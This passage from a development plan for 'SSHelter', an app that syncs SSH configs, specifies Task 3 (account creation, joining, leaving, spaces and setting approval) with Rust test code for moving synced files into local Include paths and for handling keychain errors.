git add src-tauri/src/sync/files.rs
git add src-tauri/src/config/include.rs
git add src-tauri/src/sync/engine.rs
git add src-tauri/src/sync/mod.rs
git add src/bindings/ApprovalNotice.ts
git add src/bindings/SyncConflict.ts
git commit -m "feat(sync): add the v2 runtime, engine seams and per-space file transactions"
```

---

### Task 3: 帳戶生命週期、space 操作與危險設定核准

> **已執行**(repo `8723d80`;審查後的修正 `bbb7f97`)。下面保留原本的步驟作為紀錄,不要再執行;實際的程式碼以 repo 為準,審查後與本節不同的介面(核准 / 拒絕帶 `(alias, seq)`、`reconcile_space_files` 失敗時的契約、離開與刪除帳戶)見 Global Constraints 的「Task 2–3 實際的介面」。執行後(兩個 keychain 測試都略過)是 `586 passed`(`sync::account` 15、`sync::spaces` 16、`sync::space_files` 11、`sync::hosts_file` 22);下面 Step 裡的數字是原本計畫的。

spec §7.2(除了搬移,在 B3b)、§7.3、§7.4 的使用者動作。網路一律在鎖外;會改帳戶結構的動作由呼叫端(B3b 的 Tauri
command)全程持有 lifecycle 鎖,在 `spawn_blocking` 裡呼叫。檔案一律照 spec §4.3 的順序:勾選先建檔再列進 Include;
取消勾選與刪除先移出 Include 再備份刪檔;改名以 hard link 建立新檔名,目標已存在就保留舊檔名並留下 `RenameBlocked`
提示(同一個目標只提示一次)。`reconcile_space_files` 依最新的帳戶記錄調整這台的 space 檔(改名、別台刪除、Include
順序),同步輪次提交帳戶之後也用它(Task 4)。核准把保留的區塊寫進檔案並進快取;拒絕只丟棄 pending、記下 `declined`,不推送
任何東西。離開帳戶時這台的 space 檔改成一般的本機檔案(spec §7.3):搬到 `~/.ssh/sshelter-local/`、主 config 原地改成一般
的 Include(`space_files::keep_files_local` + `hosts_file::release_include`),之後建立或加入別的帳戶都不會把它們移出
Include;搬不過去就什麼都不改、離開失敗。

**Files:**
- Create: `src-tauri/src/sync/account.rs`
- Create: `src-tauri/src/sync/spaces.rs`
- Modify: `src-tauri/src/sync/space_files.rs`(`LOCAL_INCLUDE_DIR`、`local_dir`、`KeptFile`、`keep_files_local` 與測試)
- Modify: `src-tauri/src/sync/hosts_file.rs`(`release_include` 與測試)
- Modify: `src-tauri/src/sync/mod.rs`

**Interfaces:**
- Consumes(Task 1–2):`merge::{merge_account, plan_device, put_account_record, put_space_key, space_entries, space_entry,
  space_keys, space_key_slot, space_deleted_by, device_name, selected_include_tokens, AccountMerged}`;`runtime::{mutate,
  save_core, snapshot}`;`files::{write_include, apply_effects_to_items, check_managed_items, memory_matches_disk, space_path,
  EngineWrite}`;`env::SyncEnv`;`testkit::*`、`fake_relay::FakeRelay`(測試)。
- Consumes(B2):`crypto::{generate_mnemonic, normalize_mnemonic, derive_account, derive_keys, ChainKeys}`;
  `record::{MetaPayload, RecordKind, SpacePayload, ACCOUNT_META_ID, SCHEMA_VERSION, record_key, LocalRecord}`;
  `relay::{RelayClient, RelayError}`;`space_files::{slugify, space_file_name, add_space_file, remove_space_file,
  rename_space_file, RenameOutcome, INCLUDE_DIR}`;`hosts_file::{managed_path, is_our_include_token}`;`state::MNEMONIC_ACCOUNT`;
  `state_v2::{RelayFeatures, NEXT_MNEMONIC_ACCOUNT}`;`fsutil::{backup_dir_for, ensure_dir_secure}`;`config::commands::persist_file`;
  `config::include::find_host_file_index`(測試)。
- Produces(`space_files`):`pub const LOCAL_INCLUDE_DIR: &str = "~/.ssh/sshelter-local/"`;`pub fn local_dir(ssh_dir: &Path) -> PathBuf`;
  `pub struct KeptFile { pub old_token: String, pub path: PathBuf, pub token: String }`;
  `pub fn keep_files_local(ssh_dir: &Path, files: &[PathBuf], write_include: impl FnOnce(&[KeptFile]) -> Result<(), AppError>) -> Result<Vec<KeptFile>, AppError>`
  (失敗時已建立的新路徑全部移除)。
- Produces(`hosts_file`):`pub fn release_include(items: &mut Vec<Item>, kept: &[(String, String)]) -> bool`(舊 token → 新
  token 原地替換;對照不到的我們的 token 拿掉)。
- Produces(`account`):
  - 常數:`DEFAULT_SPACE_NAME = "Personal"`、`NO_ACCOUNT_MESSAGE`、`OLD_FORMAT_MESSAGE`、`NOT_JOINED_MESSAGE`、`NO_KEYS_MESSAGE`、
    `FROZEN_MESSAGE`、`ROTATING_MESSAGE`、`READ_ONLY_MESSAGE`
  - `pub fn clean_device_name(name: &str) -> Result<String, AppError>`;`pub fn saves_allowed(env: &SyncEnv) -> Result<(), AppError>`;
    `pub fn account_ready(s: &SyncStateV2, keys: Option<&ChainKeys>) -> Result<(), AppError>`
  - `pub fn account_keys_from_keychain(read: Result<Option<String>, AppError>, chain_id: &str) -> Result<ChainKeys, String>`(錯誤字串絕不含同步碼)
  - `pub fn selected_ids(s: &SyncStateV2) -> Vec<String>`;`pub fn space_payload(name: &str, created_at_ms: u64, previous_id: Option<String>) -> SpacePayload`;
    `pub fn put_new_space(account: &mut AccountState, account_keys: &ChainKeys, space: &ChainKeys, payload: &SpacePayload, device_id: &str, now_ms: u64) -> Result<(), AppError>`
  - `pub fn create_account(env: &SyncEnv, device_name: &str) -> Result<String, AppError>`(回傳同步碼)
  - `pub fn add_selected_file(env: &SyncEnv, doc_lock: &mut Option<SshConfigDoc>, file_name: &str) -> Result<(), AppError>`
  - `pub fn join_account(env: &SyncEnv, words: &str, device_name: &str) -> Result<(), AppError>`
  - `pub fn leave_account(env: &SyncEnv, delete_remote: bool) -> Result<(), AppError>`(檔案改成本機檔案;失敗時什麼都不改)
  - `pub fn set_relay_url(env: &SyncEnv, url: &str) -> Result<(), AppError>`;`pub fn check_relay(env: &SyncEnv) -> Result<RelayFeatures, AppError>`
  - `pub fn set_device_name(env: &SyncEnv, name: &str) -> Result<(), AppError>`;`pub fn forget_device(env: &SyncEnv, device_id: &str) -> Result<(), AppError>`;
    `pub fn show_words(env: &SyncEnv) -> Result<String, AppError>`
- Produces(`spaces`):`pub fn clean_space_name(name: &str) -> Result<String, AppError>`;
  `pub struct Reconciled { pub touched: bool, pub notices: Vec<SyncNotice> }`;
  `pub fn reconcile_space_files(env: &SyncEnv, doc: &mut SshConfigDoc, backed_up: &mut HashSet<PathBuf>, retention: Option<usize>) -> Result<Reconciled, AppError>`;
  `pub fn create_space(env: &SyncEnv, name: &str) -> Result<String, AppError>`(回傳 space id);
  `pub fn rename_space(env, space_id, name)`、`pub fn delete_space(env, space_id)`、`pub fn select_space(env, space_id)`、
  `pub fn unselect_space(env, space_id)`、`pub fn rebuild_space(env, space_id)`、`pub fn reject(env, space_id, aliases: &[String])`
  —— 全部 `-> Result<(), AppError>`;`pub fn approve(env: &SyncEnv, space_id: &str, aliases: &[String]) -> Result<usize, AppError>`(回傳套用的主機數)。

- [ ] **Step 1: `src-tauri/src/sync/space_files.rs` 的測試**

離開時把檔案改成本機檔案的規則:不覆蓋(同名加 `-2`)、Include 換過去的那一刻新舊路徑都在、寫主 config 失敗就全部回復。

`src-tauri/src/sync/space_files.rs`:把

```rust
        assert_eq!(stray_space_files(dir.path(), &[listed]).unwrap(), vec!["hosts.config", "old-8b01e4aa.config"]);
    }
}
```

換成:

```rust
        assert_eq!(stray_space_files(dir.path(), &[listed]).unwrap(), vec!["hosts.config", "old-8b01e4aa.config"]);
    }

    #[test]
    fn leaving_keeps_files_as_plain_local_files_without_overwriting_any() {
        let dir = tempfile::tempdir().unwrap();
        let ssh = dir.path();
        let work = add_space_file(ssh, "work-3fa2c1d9.config", Some(b"Host a\n"), || Ok(())).unwrap();
        let home = add_space_file(ssh, "home-8b01e4aa.config", Some(b"Host b\n"), || Ok(())).unwrap();
        let gone = spaces_dir(ssh).join("gone-11111111.config");
        // 本機目錄裡已經有同名檔:不覆蓋,改用 `-2`。
        std::fs::create_dir_all(local_dir(ssh)).unwrap();
        std::fs::write(local_dir(ssh).join("work-3fa2c1d9.config"), "Host mine\n").unwrap();
        let mut seen = Vec::new();
        let kept = keep_files_local(ssh, &[work.clone(), home.clone(), gone], |kept| {
            // Include 換過去的那一刻,新路徑都已存在、舊路徑也還在:主 config 從不指向不存在的檔案。
            assert!(kept.iter().all(|k| k.path.is_file()));
            assert!(work.is_file() && home.is_file());
            seen = kept.to_vec();
            Ok(())
        })
        .unwrap();
        assert_eq!(kept, seen);
        assert_eq!(
            kept.iter().map(|k| (k.old_token.as_str(), k.token.as_str())).collect::<Vec<_>>(),
            vec![
                ("~/.ssh/sshelter/work-3fa2c1d9.config", "~/.ssh/sshelter-local/work-3fa2c1d9-2.config"),
                ("~/.ssh/sshelter/home-8b01e4aa.config", "~/.ssh/sshelter-local/home-8b01e4aa.config"),
            ],
            "files that are not there are skipped"
        );
        assert_eq!(std::fs::read_to_string(local_dir(ssh).join("work-3fa2c1d9.config")).unwrap(), "Host mine\n");
        assert_eq!(std::fs::read_to_string(&kept[0].path).unwrap(), "Host a\n");
        assert_eq!(std::fs::read_to_string(&kept[1].path).unwrap(), "Host b\n");
        assert!(!work.exists() && !home.exists(), "the old paths are gone");
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            assert_eq!(std::fs::metadata(&kept[1].path).unwrap().permissions().mode() & 0o777, 0o600);
        }
    }

    #[test]
    fn a_failed_include_update_removes_the_new_paths_and_changes_nothing() {
        let dir = tempfile::tempdir().unwrap();
        let ssh = dir.path();
        let work = add_space_file(ssh, "work-3fa2c1d9.config", Some(b"Host a\n"), || Ok(())).unwrap();
        let home = add_space_file(ssh, "home-8b01e4aa.config", Some(b"Host b\n"), || Ok(())).unwrap();
        let err = keep_files_local(ssh, &[work.clone(), home.clone()], |_| Err(AppError::Other("boom".into()))).unwrap_err();
        assert_eq!(err.to_string(), "boom");
        assert_eq!(std::fs::read_dir(local_dir(ssh)).unwrap().count(), 0, "every new path was removed");
        assert_eq!(std::fs::read_to_string(&work).unwrap(), "Host a\n");
        assert_eq!(std::fs::read_to_string(&home).unwrap(), "Host b\n");
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            assert_eq!(std::fs::metadata(local_dir(ssh)).unwrap().permissions().mode() & 0o777, 0o700);
        }
        // 複製的退路一樣不覆蓋。
        let target = local_dir(ssh).join("copy.config");
        copy_new(&work, &target).unwrap();
        assert_eq!(copy_new(&home, &target).unwrap_err().kind(), ErrorKind::AlreadyExists);
        assert_eq!(std::fs::read_to_string(&target).unwrap(), "Host a\n");
    }
}
```

- [ ] **Step 2: `src-tauri/src/sync/hosts_file.rs` 的測試**

我們的 token 原地換成本機路徑之後,`ensure_include` 不再碰它們。

`src-tauri/src/sync/hosts_file.rs`:把

```rust

    #[test]
    fn our_include_tokens_are_the_config_paths_under_the_sshelter_directory() {
        assert!(is_our_include_token(INCLUDE_VALUE));
```

換成:

```rust

    #[test]
    fn released_tokens_become_plain_includes_that_ensure_include_leaves_alone() {
        let local = "~/.ssh/sshelter-local/work-3fa2c1d9.config";
        let (mut items, _) = parse_file(&format!("# main\nInclude {WORK} ~/.ssh/a.config {HOME}\nHost a\n"));
        let kept = vec![(WORK.to_string(), local.to_string())];
        assert!(release_include(&mut items, &kept));
        // 位置不變、別人的路徑留在原地;對照不到的我們的 token(檔案已經不在)拿掉。
        assert_eq!(serialize_items(&items, true), format!("# main\nInclude {local} ~/.ssh/a.config\nHost a\n"));
        assert!(!release_include(&mut items, &kept), "nothing of ours is left");
        assert!(!is_our_include_token(local));
        // 之後建立或加入別的帳戶:我們的一行放在最頂端,本機那一行原封不動;沒有勾選任何 space 時也不碰它。
        assert!(ensure_include(&mut items, &list(&[HOME])));
        assert_eq!(serialize_items(&items, true), format!("# main\nInclude {HOME}\nInclude {local} ~/.ssh/a.config\nHost a\n"));
        assert!(ensure_include(&mut items, &[]));
        assert_eq!(serialize_items(&items, true), format!("# main\nInclude {local} ~/.ssh/a.config\nHost a\n"));
        // 整行只剩我們的 token、而且都對照不到:整行移除。
        let (mut only, _) = parse_file(&format!("Include {WORK}\nHost a\n"));
        assert!(release_include(&mut only, &[]));
        assert_eq!(serialize_items(&only, true), "Host a\n");
        // 生效中的一行改寫之後仍是生效的一行,不會變成註解(同 `ensure_include`)。
        let (mut live, _) = parse_file(&format!("Include {WORK}\nHost a\n"));
        if let Item::Directive(d) = &mut live[0] {
            d.enabled = false;
        }
        assert!(release_include(&mut live, &kept));
        assert_eq!(serialize_items(&live, true), format!("Include {local}\nHost a\n"));
    }

    #[test]
    fn our_include_tokens_are_the_config_paths_under_the_sshelter_directory() {
        assert!(is_our_include_token(INCLUDE_VALUE));
```

- [ ] **Step 3: 寫失敗的測試:`src-tauri/src/sync/account.rs`**

離開的測試涵蓋換 relay 的流程(離開 → 再建立帳戶,舊主機照樣讀得到)、搬不過去時什麼都不改、放棄 v1 升級時的 `hosts.config`。

測試裡的 `upload_account` 依 Task 1 實際的介面:`push_outgoing` 回 `Pushed`,先確認沒有 `error`、沒有 `frozen` 再套用。

建立 `src-tauri/src/sync/account.rs`,先只放 module 註解、`use` 與測試(實作在後面的步驟加入):

```rust
//! 帳戶生命週期(spec §7.3)與這台的同步設定:建立、加入、離開(含刪除帳戶)、relay URL 與 `GET /v1/info`、裝置
//! 名稱、Forget、顯示同步碼。網路一律在鎖外;會改帳戶的動作由呼叫端(Tauri command)全程持有 lifecycle 鎖、在
//! `spawn_blocking` 裡呼叫。

use std::path::PathBuf;

use crate::config::commands::persist_file;
use crate::config::model::SshConfigDoc;
use crate::error::AppError;
use crate::sync::crypto::{self, ChainKeys};
use crate::sync::env::SyncEnv;
use crate::sync::files::write_include;
use crate::sync::hosts_file::{self, release_include};
use crate::sync::merge::{
    merge_account, plan_device, put_account_record, put_space_key, space_entries, space_keys, AccountMerged,
};
use crate::sync::record::{MetaPayload, RecordKind, SpacePayload, ACCOUNT_META_ID, SCHEMA_VERSION};
use crate::sync::relay::{RelayClient, RelayError};
use crate::sync::runtime::{mutate, save_core, snapshot};
use crate::sync::space_files::{self, slugify, space_file_name, KeptFile};
use crate::sync::state::MNEMONIC_ACCOUNT;
use crate::sync::state_v2::{AccountState, RelayFeatures, SpaceState, SyncNotice, SyncStateV2, NEXT_MNEMONIC_ACCOUNT};

#[cfg(test)]
mod tests {
    use super::*;
    use crate::sync::fake_relay::FakeRelay;
    use crate::sync::merge::{account_outgoing, apply_pushed_account, devices, push_outgoing};
    use crate::sync::record::{rotation_meta_id, DevicePayload, RotationMarkerPayload};
    use crate::sync::relay::RelayApi;
    use crate::sync::testkit::{TestClock, TestDevice};

    const WORDS: &str = "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon art";

    /// 不經過同步輪次,把這台帳戶區段的 dirty 記錄推上 relay(讓另一台加入時拉得到)。
    pub(crate) fn upload_account(d: &TestDevice) {
        let mut core = d.runtime.core.lock().unwrap();
        let keys = core.account_keys.clone().unwrap();
        let account = core.state.as_mut().unwrap().account.as_mut().unwrap();
        let outgoing = account_outgoing(account, &keys).unwrap();
        let pushed = push_outgoing(d.relay.as_ref(), &keys.chain_id, &keys.auth_token, &outgoing);
        assert!(pushed.error.is_none() && !pushed.frozen, "{:?}", pushed.error);
        apply_pushed_account(account, &outgoing, &pushed);
    }

    #[test]
    fn creating_an_account_makes_a_selected_personal_space_and_keeps_the_code() {
        let (relay, clock) = (FakeRelay::new(), TestClock::new());
        let a = TestDevice::new("a", &relay, &clock);
        let words = create_account(&a.env(), " MacBook-A ").unwrap();
        assert_eq!(words.split(' ').count(), 24);
        assert_eq!(a.keychain.entry(MNEMONIC_ACCOUNT).as_deref(), Some(words.as_str()));
        let s = a.state();
        assert_eq!(s.device_name, "MacBook-A");
        let account = s.account.as_ref().unwrap();
        assert_eq!(account.chain_id, crypto::derive_account(&words).unwrap().chain_id);
        assert!(relay.exists(&account.chain_id));
        let entries = space_entries(account);
        assert_eq!(entries.iter().map(|e| e.name.as_str()).collect::<Vec<_>>(), vec!["Personal"]);
        let personal = &entries[0].id;
        assert!(relay.exists(personal), "the Personal space chain exists");
        assert_ne!(personal, &crypto::derive_space0(&words).unwrap().chain_id, "Personal is random, not space0");
        assert!(account.records.contains_key("meta:account"));
        let device: DevicePayload = serde_json::from_value(account.records[&format!("device:{}", s.device_id)].record.payload.clone()).unwrap();
        assert_eq!(device.spaces, vec![personal.clone()]);
        let space = &s.spaces[personal];
        assert!(space.selected && space.baseline_established);
        assert!(a.space_path(personal).is_file());
        assert!(a.main_config().contains(&format!("Include ~/.ssh/sshelter/{}", space.file_name)));
        assert!(create_account(&a.env(), "A").is_err(), "already in an account");
    }

    #[test]
    fn create_and_join_need_a_name_a_relay_and_a_loaded_config() {
        let (relay, clock) = (FakeRelay::new(), TestClock::new());
        let a = TestDevice::new("a", &relay, &clock);
        assert_eq!(create_account(&a.env(), "  ").unwrap_err().to_string(), "device name cannot be empty");
        a.runtime.core.lock().unwrap().state.as_mut().unwrap().relay_url = String::new();
        assert_eq!(create_account(&a.env(), "A").unwrap_err().to_string(), NO_RELAY_MESSAGE);
        assert_eq!(join_account(&a.env(), WORDS, "A").unwrap_err().to_string(), NO_RELAY_MESSAGE);
        *a.doc.lock().unwrap() = None;
        assert_eq!(create_account(&a.env(), "A").unwrap_err().to_string(), NO_CONFIG_MESSAGE);
        assert!(a.keychain.entry(MNEMONIC_ACCOUNT).is_none(), "nothing reached the keychain");
    }

    #[test]
    fn joining_needs_an_existing_account_and_refuses_a_changed_code() {
        let (relay, clock) = (FakeRelay::new(), TestClock::new());
        let a = TestDevice::new("a", &relay, &clock);
        let b = TestDevice::new("b", &relay, &clock);
        // 沒有帳戶:不建立。
        let err = join_account(&b.env(), WORDS, "B").unwrap_err();
        assert!(matches!(&err, AppError::NotFound(m) if m == NO_ACCOUNT_MESSAGE), "{err}");
        assert!(!relay.exists(&crypto::derive_account(WORDS).unwrap().chain_id));
        // 只有 v1 的 chain:說明要先升級。
        let v1 = crypto::derive_keys(WORDS).unwrap();
        relay.create_chain(&v1.chain_id, &v1.auth_token).unwrap();
        assert_eq!(join_account(&b.env(), WORDS, "B").unwrap_err().to_string(), format!("not found: {OLD_FORMAT_MESSAGE}"));
        // 正常加入:帳戶的 space 都看得到,還沒有勾選。
        let words = create_account(&a.env(), "A").unwrap();
        upload_account(&a);
        join_account(&b.env(), &words.to_uppercase(), "B").unwrap();
        let s = b.state();
        assert!(s.spaces.is_empty());
        let account = s.account.as_ref().unwrap();
        assert_eq!(space_entries(account)[0].name, "Personal");
        assert!(account.records[&format!("device:{}", s.device_id)].dirty);
        assert_eq!(devices(account).len(), 2);
        assert_eq!(b.keychain.entry(MNEMONIC_ACCOUNT).as_deref(), Some(words.as_str()));
        // 帳戶帶著更換標記:這組同步碼已被更換,不加入。
        let c = TestDevice::new("c", &relay, &clock);
        {
            let mut core = a.runtime.core.lock().unwrap();
            let me = core.state.as_ref().unwrap().device_id.clone();
            let account = core.state.as_mut().unwrap().account.as_mut().unwrap();
            let marker = RotationMarkerPayload { rotated_at_ms: 1, by_device_id: me.clone(), by_device_name: "MacBook-A".into() };
            put_account_record(account, RecordKind::Meta, &rotation_meta_id(&me), serde_json::to_value(marker).unwrap(), false, &me, 5);
        }
        upload_account(&a);
        assert_eq!(
            join_account(&c.env(), &words, "C").unwrap_err().to_string(),
            "this sync code was changed on MacBook-A; enter the new sync code"
        );
        assert!(c.keychain.entry(MNEMONIC_ACCOUNT).is_none());
    }

    /// 主 config 與它 Include 的檔案裡,定義 `alias` 的那個檔案(ssh 會用的那一份)。
    fn host_file(d: &TestDevice, alias: &str) -> Option<std::path::PathBuf> {
        let doc = d.doc.lock().unwrap();
        let doc = doc.as_ref().unwrap();
        crate::config::include::find_host_file_index(doc, alias).map(|i| doc.files[i].path.clone())
    }

    #[test]
    fn leaving_keeps_the_space_files_as_local_files_that_ssh_still_reads() {
        let (relay, clock) = (FakeRelay::new(), TestClock::new());
        let a = TestDevice::with_main_config("a", &relay, &clock, "# main\nHost local\n");
        create_account(&a.env(), "A").unwrap();
        let personal = a.state().spaces.keys().next().unwrap().clone();
        let file = a.space_path(&personal);
        let file_name = file.file_name().unwrap().to_string_lossy().into_owned();
        a.save_in_app(&file, "Host web\n  HostName 10.0.0.1\n");
        leave_account(&a.env(), false).unwrap();
        let s = a.state();
        assert!(!s.joined() && s.spaces.is_empty() && !s.phrase_cleanup_pending);
        assert!(a.keychain.entry(MNEMONIC_ACCOUNT).is_none());
        assert!(a.runtime.core.lock().unwrap().account_keys.is_none());
        // 檔案搬到 ~/.ssh/sshelter-local/,主 config 原地改成一般的 Include(優先順序不變)。
        let kept = space_files::local_dir(&a.ssh_dir()).join(&file_name);
        assert!(!file.exists());
        assert_eq!(a.read(&kept), "Host web\n  HostName 10.0.0.1\n");
        assert_eq!(a.main_config(), format!("# main\nInclude ~/.ssh/sshelter-local/{file_name}\nHost local\n"));
        assert_eq!(s.notices, vec![SyncNotice::LeftAccount { kept_files: vec![kept.to_string_lossy().into_owned()] }]);
        assert_eq!(a.events.notices.lock().unwrap().last(), s.notices.last());
        assert_eq!(host_file(&a, "web"), Some(kept.clone()), "ssh and the app still read the host");
        // 換 relay 的流程(spec §7.3):離開 → 建立新帳戶。新帳戶的 Include 放在最頂端,舊檔案的 Include 原封不動。
        create_account(&a.env(), "A").unwrap();
        let new_name = a.state().spaces.values().next().unwrap().file_name.clone();
        assert_ne!(new_name, file_name);
        assert_eq!(
            a.main_config(),
            format!("# main\nInclude ~/.ssh/sshelter/{new_name}\nInclude ~/.ssh/sshelter-local/{file_name}\nHost local\n")
        );
        assert_eq!(host_file(&a, "web"), Some(kept));
    }

    #[test]
    fn a_failed_move_changes_nothing_and_leaving_can_be_retried() {
        let (relay, clock) = (FakeRelay::new(), TestClock::new());
        let a = TestDevice::new("a", &relay, &clock);
        create_account(&a.env(), "A").unwrap();
        crate::sync::spaces::create_space(&a.env(), "Work").unwrap();
        let files: Vec<std::path::PathBuf> = a.state().spaces.keys().map(|id| a.space_path(id)).collect();
        assert_eq!(files.len(), 2);
        // 主 config 在 app 以外被改過(doc 過時):寫回 Include 時 `persist_file` 拒絕 —— 已經建立的本機檔案全部移除。
        let edited = format!("{}# edited elsewhere\n", a.main_config());
        a.write_externally(&a.main_path(), &edited);
        let err = leave_account(&a.env(), false).unwrap_err();
        assert!(err.to_string().starts_with("could not keep this device's synced files as local files"), "{err}");
        assert!(a.state().joined());
        assert!(a.keychain.entry(MNEMONIC_ACCOUNT).is_some());
        assert!(files.iter().all(|f| f.is_file()), "the space files stay where they were");
        assert_eq!(std::fs::read_dir(space_files::local_dir(&a.ssh_dir())).unwrap().count(), 0);
        assert_eq!(a.main_config(), edited);
        // doc 已從磁碟重載:再離開一次就成功。
        leave_account(&a.env(), false).unwrap();
        assert!(!a.state().joined());
        assert!(files.iter().all(|f| !f.exists()));
        assert_eq!(std::fs::read_dir(space_files::local_dir(&a.ssh_dir())).unwrap().count(), 2);
        assert!(a.main_config().ends_with("# edited elsewhere\n"));
    }

    #[test]
    fn abandoning_the_upgrade_keeps_the_v1_hosts_as_a_local_file() {
        let (relay, clock) = (FakeRelay::new(), TestClock::new());
        let a = TestDevice::with_main_config("a", &relay, &clock, "Include ~/.ssh/sshelter/hosts.config\nHost local\n");
        let v1_file = hosts_file::managed_path(&a.ssh_dir());
        std::fs::create_dir_all(v1_file.parent().unwrap()).unwrap();
        std::fs::write(&v1_file, "Host web\n").unwrap();
        a.reload();
        let mut v1 = crate::sync::state::SyncState::fresh("A").unwrap();
        v1.chain_id = Some("ab".repeat(32));
        a.runtime.core.lock().unwrap().legacy = Some(v1);
        leave_account(&a.env(), false).unwrap();
        assert!(a.runtime.core.lock().unwrap().legacy.is_none(), "the upgrade is abandoned");
        let kept = space_files::local_dir(&a.ssh_dir()).join("hosts.config");
        assert!(!v1_file.exists());
        assert_eq!(a.read(&kept), "Host web\n");
        assert_eq!(a.main_config(), "Include ~/.ssh/sshelter-local/hosts.config\nHost local\n");
        assert_eq!(a.state().notices, vec![SyncNotice::LeftAccount { kept_files: vec![kept.to_string_lossy().into_owned()] }]);
        // 之後建立帳戶:v1 的主機照樣讀得到。
        create_account(&a.env(), "A").unwrap();
        assert!(a.main_config().contains("Include ~/.ssh/sshelter-local/hosts.config"));
        assert_eq!(host_file(&a, "web"), Some(kept));
    }

    #[test]
    fn a_failed_keychain_cleanup_is_remembered_and_retried() {
        let (relay, clock) = (FakeRelay::new(), TestClock::new());
        let a = TestDevice::new("a", &relay, &clock);
        create_account(&a.env(), "A").unwrap();
        a.keychain.fail_deletes.store(true, std::sync::atomic::Ordering::SeqCst);
        let err = leave_account(&a.env(), false).unwrap_err();
        assert!(err.to_string().starts_with("left the sync account, but the sync code could not be removed"), "{err}");
        assert!(a.state().phrase_cleanup_pending);
        assert!(!a.state().joined(), "the account part is gone even so");
        a.keychain.fail_deletes.store(false, std::sync::atomic::Ordering::SeqCst);
        leave_account(&a.env(), false).unwrap();
        assert!(!a.state().phrase_cleanup_pending);
        assert!(a.keychain.entry(MNEMONIC_ACCOUNT).is_none());
    }

    #[test]
    fn deleting_the_account_deletes_every_chain_first() {
        let (relay, clock) = (FakeRelay::new(), TestClock::new());
        let a = TestDevice::new("a", &relay, &clock);
        create_account(&a.env(), "A").unwrap();
        let s = a.state();
        let account_chain = s.account.as_ref().unwrap().chain_id.clone();
        let personal = s.spaces.keys().next().unwrap().clone();
        leave_account(&a.env(), true).unwrap();
        assert!(!relay.exists(&account_chain) && !relay.exists(&personal));
        // relay 連不上:什麼都不改。
        let b = TestDevice::new("b", &relay, &clock);
        create_account(&b.env(), "B").unwrap();
        relay.set_offline(true);
        assert!(leave_account(&b.env(), true).is_err());
        assert!(b.state().joined());
    }

    #[test]
    fn the_relay_url_can_only_change_while_not_joined_and_is_checked_again() {
        let (relay, clock) = (FakeRelay::new(), TestClock::new());
        let a = TestDevice::new("a", &relay, &clock);
        assert!(set_relay_url(&a.env(), "http://relay.example.com").is_err(), "plain http is refused");
        set_relay_url(&a.env(), "https://other.example.com/").unwrap();
        assert_eq!(a.state().relay_url, "https://other.example.com");
        let features = check_relay(&a.env()).unwrap();
        assert!(features.supports("freeze") && features.supports("pull-batch"));
        assert_eq!(a.state().relay_features.unwrap().url, "https://other.example.com");
        set_relay_url(&a.env(), crate::sync::testkit::RELAY_URL).unwrap();
        assert!(a.state().relay_features.is_none(), "a new URL is checked again");
        create_account(&a.env(), "A").unwrap();
        assert!(set_relay_url(&a.env(), "https://third.example.com").is_err());
    }

    #[test]
    fn renaming_and_forgetting_devices_write_account_records() {
        let (relay, clock) = (FakeRelay::new(), TestClock::new());
        let a = TestDevice::new("a", &relay, &clock);
        let b = TestDevice::new("b", &relay, &clock);
        let words = create_account(&a.env(), "A").unwrap();
        upload_account(&a);
        join_account(&b.env(), &words, "B").unwrap();
        upload_account(&b);
        set_device_name(&a.env(), "Work laptop").unwrap();
        let s = a.state();
        let me: DevicePayload = serde_json::from_value(s.account.as_ref().unwrap().records[&format!("device:{}", s.device_id)].record.payload.clone()).unwrap();
        assert_eq!(me.name, "Work laptop");
        assert!(forget_device(&a.env(), &s.device_id).is_err(), "this device leaves instead");
        // A 還沒拉到 B 的裝置記錄:不認得它。
        assert!(matches!(forget_device(&a.env(), &b.state().device_id), Err(AppError::NotFound(_))));
        let b_id = b.state().device_id;
        let pulled = relay.pull(&s.account.as_ref().unwrap().chain_id, &crypto::derive_account(&words).unwrap().auth_token, 0).unwrap();
        {
            let mut core = a.runtime.core.lock().unwrap();
            let keys = core.account_keys.clone().unwrap();
            let account = core.state.as_mut().unwrap().account.as_mut().unwrap();
            *account = merge_account(account, &keys, &pulled).section;
        }
        forget_device(&a.env(), &b_id).unwrap();
        assert!(a.state().account.as_ref().unwrap().records[&format!("device:{b_id}")].record.deleted);
        assert_eq!(show_words(&a.env()).unwrap(), words);
    }

    #[test]
    fn keychain_problems_at_startup_get_distinct_messages_and_never_echo_the_code() {
        let chain = crypto::derive_account(WORDS).unwrap().chain_id;
        assert!(account_keys_from_keychain(Ok(Some(WORDS.to_string())), &chain).is_ok());
        assert_eq!(
            account_keys_from_keychain(Ok(None), &chain).unwrap_err(),
            "the sync code is missing from the keychain; leave and join again"
        );
        let locked = account_keys_from_keychain(Err(AppError::Other("keychain error: locked".into())), &chain).unwrap_err();
        assert!(locked.ends_with("unlock the keychain and restart SSHelter"), "{locked}");
        let broken = account_keys_from_keychain(Ok(Some("zebra sunshine".into())), &chain).unwrap_err();
        assert!(!broken.contains("zebra"));
        assert_eq!(account_keys_from_keychain(Ok(Some(WORDS.to_string())), &"cd".repeat(32)).unwrap_err(), OTHER_ACCOUNT_MESSAGE);
    }
}
```

- [ ] **Step 4: 寫失敗的測試:`src-tauri/src/sync/spaces.rs`**

建立 `src-tauri/src/sync/spaces.rs`,先只放 module 註解、`use` 與測試(實作在後面的步驟加入):

```rust
//! Space 操作(spec §7.2)與危險設定的核准(spec §7.4):建立、改名、刪除、勾選、取消勾選、chain 不見時重建
//! (spec §9)、核准、拒絕;以及依最新的帳戶記錄調整這台的 space 檔(`reconcile_space_files`:改名、別台刪除、
//! Include 順序 —— 同步輪次提交帳戶之後也用它)。檔案一律照 spec §4.3 的順序:勾選先建檔再列進 Include;取消勾選與
//! 刪除先移出 Include 再備份刪檔;改名以 hard link 建立新檔名、目標已存在就保留舊檔名並提示。

use std::collections::HashSet;
use std::path::PathBuf;

use crate::config::commands::persist_file;
use crate::config::model::SshConfigDoc;
use crate::error::AppError;
use crate::sync::account::{account_ready, add_selected_file, put_new_space, selected_ids, space_payload, NOT_JOINED_MESSAGE};
use crate::sync::crypto::ChainKeys;
use crate::sync::env::SyncEnv;
use crate::sync::files::{apply_effects_to_items, check_managed_items, memory_matches_disk, space_path, write_include, EngineWrite};
use crate::sync::merge::{
